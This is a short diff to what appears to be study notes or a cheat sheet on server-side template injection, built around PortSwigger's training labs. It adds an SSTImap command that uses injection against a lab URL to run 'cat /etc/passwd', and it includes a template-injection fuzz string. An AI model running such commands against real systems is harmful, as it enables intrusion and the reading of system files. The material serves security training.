@@ -4094,6 +4094,12 @@ fuzzer${{<%[%'"}}%\<>
   
 [PortSwigger Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)  
 
+With `SSTImap`:
+
+```
+python /opt/SSTImap/sstimap.py -u https://0a01008504c8e38782f3b0e200cc00de.web-security-academy.net/\?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /etc/passwd"
+```
+
 ### Handlebars  
 
 >Handlebars Template can be identified by injecting below set of characters and not encoding them into the `GET /?message=Unfortunately this product is out of stock` parameter. [SSTIMAP](https://github.com/vladko312/SSTImap) was not able to identify this handlebars SSTI vulnerability.  
